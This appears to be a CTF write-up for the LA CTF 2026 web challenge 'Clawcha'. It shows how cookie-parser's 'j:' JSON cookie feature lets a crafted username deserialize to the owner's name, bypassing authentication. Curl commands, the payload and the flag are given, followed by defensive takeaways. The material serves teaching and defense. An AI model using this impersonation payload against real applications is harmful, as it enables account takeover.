@@ -1,0 +1,178 @@
+---
+title: 'LA CTF 2026 - Clawcha'
+description: 'Writeup for Clawcha from LA CTF 2026. A Web challenge involving cookie-parser deserialization and identity confusion.'
+date: 2026-02-09
+tags: ['writeup', 'web', 'nodejs', 'deserialization', 'impersonation', 'lactf']
+authors: ['kudaliar']
+draft: false
+---
+
+**Flag:** `lactf{m4yb3_th3_r34l_g4ch4_w4s_l7f3}`
+
+## Challenge Overview
+
+Clawcha is a gacha/claw machine web application built with Express.js. Players can "pull" items from an inventory, each with a different probability of success. The flag is hidden behind an item with a probability of `1e-15` — effectively impossible to win by chance. However, the application's **owner** account bypasses the probability check entirely.
+
+## Source Code Analysis
+
+The application consists of three key files:
+
+### `app.js` — Main Server
+
+```js
+inventory.addItem({
+  name: 'flag',
+  probability: 1e-15, // good luck
+  msg: process.env.FLAG ?? 'lactf{test_flag}'
+});
+
+const secret = process.env.SECRET || crypto.randomBytes(16).toString('hex');
+
+const users = new Map([
+  ['r2uwu2', {
+    username: 'r2uwu2',
+    password: secret,
+    owner: true,
+  }],
+]);
+```
+
+The flag is an inventory item with near-zero probability. A single owner account `r2uwu2` exists, whose password is the same cryptographic secret used for cookie signing — unknown and unguessable.
+
+### Authentication Middleware
+
+```js
+app.use((req, res, next) => {
+  if (typeof req.signedCookies.username === 'string') {
+    if (users.has(req.signedCookies.username)) {
+      res.locals.user = users.get(req.signedCookies.username);
+    }
+  }
+  next();
+});
+```
+
+The middleware reads the `username` from a **signed cookie**, looks it up in the users Map, and attaches the user object to `res.locals.user`. Two important checks:
+1. The cookie value must be a `string`
+2. The username must exist in the users Map
+
+### `/claw` Endpoint
+
+```js
+app.post('/claw', (req, res) => {
+  const isOwner = res.locals.user?.owner ?? false;
+  const item = inventory.gacha(req.body.item);
+  const pulled = (item && (Math.random() < item.probability || isOwner))
+    ? item
+    : null;
+  // ...
+});
+```
+
+If `isOwner` is truthy, the probability check is bypassed and the item is always returned. This is the only way to reliably get the flag.
+
+### `/login` Endpoint (Combined Login/Register)
+
+```js
+app.post('/login', (req, res) => {
+  const username = req.body.username;
+  const password = req.body.password;
+  if (typeof username !== 'string' || typeof password !== 'string') {
+    res.json({ err: 'please provide a username' });
+    return;
+  }
+  if (!users.has(username)) {
+    users.set(username, { username, password, owner: false });
+  }
+  if (users.get(username).password !== password) {
+    res.json({ err: 'incorrect creds' });
+    return;
+  }
+  res.cookie('username', username, { signed: true }).json({ success: true });
+});
+```
+
+New users are created with `owner: false`. Existing users (like `r2uwu2`) cannot be re-registered. The signed cookie is set to whatever username string the user provided.
+
+## Identifying the Vulnerability
+
+The vulnerability lies in how `cookie-parser` handles cookie values. Looking at the `cookie-parser` source (`node_modules/cookie-parser/index.js`):
+
+```js
+req.signedCookies = signedCookies(val, secrets);
+req.signedCookies = JSONCookies(req.signedCookies);  // <-- key line
+```
+
+After unsigning cookies, `cookie-parser` passes them through `JSONCookies()`, which calls `JSONCookie()` on each value:
+
+```js
+function JSONCookie (str) {
+  if (typeof str !== 'string' || str.substr(0, 2) !== 'j:') {
+    return undefined;
+  }
+  try {
+    return JSON.parse(str.slice(2));
+  } catch (err) {
+    return undefined;
+  }
+}
+```
+
+Any cookie value starting with `j:` is automatically JSON-deserialized. This is a documented feature of `cookie-parser` for storing structured data in cookies — but it creates a critical deserialization mismatch.
+
+### The Attack
+
+The login endpoint stores the username **as-is** in the Map and signs it into a cookie. If we register with a username like `j:"r2uwu2"`, the following chain of events occurs:
+
+**Registration (Step 1):**
+
+1. We POST `{"username": "j:\"r2uwu2\"", "password": "anything"}`
+2. The server stores a new user with Map key `j:"r2uwu2"` and `owner: false`
+3. The server signs the cookie value `j:"r2uwu2"` with the secret
+
+**Cookie Deserialization (Step 2):**
+
+1. On the next request, `cookie-parser` unsigns the cookie, recovering `j:"r2uwu2"`
+2. `JSONCookie()` detects the `j:` prefix
+3. `JSON.parse('"r2uwu2"')` returns the string `r2uwu2` (JSON string literal)
+4. `req.signedCookies.username` is now `"r2uwu2"` — **the owner's username**
+
+**Authentication Bypass (Step 3):**
+
+1. The middleware checks `typeof req.signedCookies.username === 'string'` — passes (it's a string)
+2. `users.has("r2uwu2")` — passes (the owner exists)
+3. `res.locals.user = users.get("r2uwu2")` — returns `{ owner: true }`
+4. `isOwner` becomes `true`, bypassing the probability check
+
+### Handling Collisions
+
+Since the challenge instance is shared, another player may have already registered `j:"r2uwu2"`. To get around this, we can use **JSON unicode escape sequences**. JSON supports `\uXXXX` escapes, so `"\u0072\u0032\u0075\u0077\u0075\u0032"` also decodes to `r2uwu2`.
+
+The username `j:"\u0072\u0032\u0075\u0077\u0075\u0032"` is a different string in the Map (the backslash-u sequences are stored literally), but `JSON.parse` resolves the escapes and produces the same result: `r2uwu2`.
+
+## Exploit
+
+```bash
+# Step 1: Register with a crafted username that JSON-deserializes to "r2uwu2"
+curl -s -X POST https://clawcha.chall.lac.tf/login \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"j:\"\\u0072\\u0032\\u0075\\u0077\\u0075\\u0032\"","password":"pwn"}' \
+  -c cookies.txt
+
+# Step 2: Use the cookie to pull the flag
+curl -s -X POST https://clawcha.chall.lac.tf/claw \
+  -H 'Content-Type: application/json' \
+  -d '{"item":"flag"}' \
+  -b cookies.txt
+```
+
+**Output:**
+```json
+{"success":true,"msg":"lactf{m4yb3_th3_r34l_g4ch4_w4s_l7f3}"}
+```
+
+## Key Takeaways
+
+- **Implicit deserialization is dangerous.** `cookie-parser`'s `j:` prefix feature silently transforms string cookie values into arbitrary JSON types. This created a gap between what the server stored (a literal username string) and what the middleware received (a deserialized value).
+- **Identity confusion through serialization boundaries.** The username crosses two serialization boundaries: it is stored as a Map key (raw string), signed into a cookie (raw string), then deserialized by `JSONCookie` (JSON-decoded string). The mismatch between the stored key and the deserialized value is the root cause.
+- **Defense:** Validate cookie values after deserialization, not just before. Alternatively, disable `cookie-parser`'s JSON cookie feature if it isn't needed, or sanitize usernames to reject the `j:` prefix.
